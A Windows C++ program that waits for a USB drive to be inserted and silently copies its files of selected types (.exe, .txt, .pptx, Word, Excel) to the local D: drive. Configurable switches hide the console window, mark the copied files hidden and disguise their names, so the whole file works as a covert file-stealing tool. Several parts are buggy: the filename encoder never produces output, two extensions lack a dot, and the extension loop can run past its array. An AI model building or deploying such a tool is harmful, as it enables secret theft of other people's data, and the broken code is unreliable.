#include<iostream>
#include<windows.h>
#include<boost/filesystem.hpp>
using namespace std;
using namespace boost::filesystem;


////////////////      控制台      \\\\\\\\\\\\\\\\\

const char sensitiveWords[]
{
	'\"',
	'*',
	'/',
	':',
	'<',
	'>',
	'?',
	'\\',
	'|'
};

const char targetExtension[][32]
{
	//要复制的文件的格式
	//全部文件使用: "*.*"
	//"*.*",
	".exe",
	".txt",
	".pptx",
	"docx",
	"xlsx",
};

#define RESERVE_DIRECTORY	true	// * 连同目录一起复制
#define LOG_FILE			true	// * 日志文件
#define LF_LOCATION			""		// * 日志文件输出位置
#define DELAY_TIME			3		//扫描间隔时间(单位:秒)
#define SHOW_CONSOLE		true	//是否显示控制台
#define SHOW_FILES			true	//是否列出文件列表在控制台
#define OVERWRITER			true	//是否覆盖已有文件
#define FILENAME_ENCRYPT	false	// * 是否加密文件名(加密方式:字符位移)
#define FNE_DISPLACEMENT	1		// * 位移大小(FILENAME_ENCRYPT为true时有效)
#define HIDE_FILE			false	//隐藏被复制的文件
#define DESTINATION			"D:/"	//复制文件的目的地

////////////////      控制台      \\\\\\\\\\\\\\\\\


int getRemovableDriver(char(*remDrvList)[4])
{
	char drvString[1024]{};
	int drvTotal = GetLogicalDriveStringsA(1024, drvString) / 4;
	int count = 0;
	for (int i = 0; i < drvTotal; i++)
	{
		if (GetDriveTypeA(drvString + i * 4) == DRIVE_REMOVABLE)
		{
			strcpy_s(remDrvList[count++], 4, drvString + i * 4);
		}
	}
	return count;
}

void fileNameEncrypt(char* plaintext, char* ciphertext)
{
	/*
		空格	-> 32 最小
		~	-> 126 最大

		一定不能包含的有：
		" -> 34
		* -> 42
		/ -> 47
		: -> 58
		< -> 60
		> -> 62
		? -> 63
		\ -> 92
		| -> 124

	*/

	size_t len_pla = strlen(plaintext);
	size_t len_sen = strlen(sensitiveWords);
	for (int i = 0; i < len_pla; i++)
	{
		for (int j = 0; j < len_sen; j++)
		{
			if (plaintext[i] + FNE_DISPLACEMENT != sensitiveWords[j])
			{
				plaintext[i] = plaintext[i] + FNE_DISPLACEMENT;
			}
			else
			{

			}
		}
	}



}

void copyFiles(const char* src)
{
	for (recursive_directory_iterator iter(path(src, native)), end; iter != end; iter++)
	{
		if (!is_directory(*iter))
		{
			for (int i = 0; targetExtension[i][0] != (char)'\0'; i++)
			{
				if (strcmp(iter->path().extension().string().c_str(), targetExtension[i]) == 0)
				{
					char srcFilePath[1024]{};
					strcat_s(srcFilePath, 1024, iter->path().root_path().string().c_str());
					strcat_s(srcFilePath, 1024, iter->path().relative_path().string().c_str());
					char desFilePath[1024]{};
					strcat_s(desFilePath, 1024, DESTINATION);

					if (FILENAME_ENCRYPT)
					{
						char plaintext[1024]{}, ciphertext[1024]{};
						strcpy_s(plaintext, 1024, iter->path().filename().string().c_str());
						fileNameEncrypt(plaintext, ciphertext);
						strcat_s(desFilePath, 1024, ciphertext);
					}
					else
					{
						strcat_s(desFilePath, 1024, iter->path().filename().string().c_str());
					}


					bool copySuccess = CopyFileA(srcFilePath, desFilePath, !OVERWRITER);
					//char say[1024]{};	//预留

					if (SHOW_FILES)
					{
						for (int i = 0; i < 1024; i++)if (srcFilePath[i] == (char)'\\')srcFilePath[i] = (char)'/';
						for (int i = 0; i < 1024; i++)if (desFilePath[i] == (char)'\\')desFilePath[i] = (char)'/';
						if (copySuccess)
						{
							if (HIDE_FILE)
							{
								cout << "|SUCCESS ";
							}
							else cout << "|SUCCESS| " << srcFilePath << " -> " << desFilePath << endl;
						}
						//要么是已经隐藏了的文件，不然就是真的复制失败了。
						else cout << "|FAIL| " << srcFilePath << endl;
					}

					if (HIDE_FILE)
					{
						DWORD oldAttribute = GetFileAttributesA(srcFilePath);
						if (SetFileAttributesA(desFilePath, oldAttribute | FILE_ATTRIBUTE_HIDDEN) && SHOW_FILES)
							cout << "(HIDDEN)| " << srcFilePath << " -> " << desFilePath << endl;
					}

					break;
				}
			}
		}
	}
}


int main()
{
	HWND hwnd = GetForegroundWindow();
	if (SHOW_CONSOLE)
	{
		ShowWindow(hwnd, SW_SHOW);
	}
	else
	{
		ShowWindow(hwnd, SW_HIDE);
	}

	char remDrvList[32][4]{};
	int c = 114514;
	unsigned long long count = 0;

	do
	{
		c = getRemovableDriver(remDrvList);
		Sleep(3 * 1000);
	} while (c == 0);

	for (int i = 0; i < c; i++)
	{
		copyFiles(remDrvList[i]);
	}
}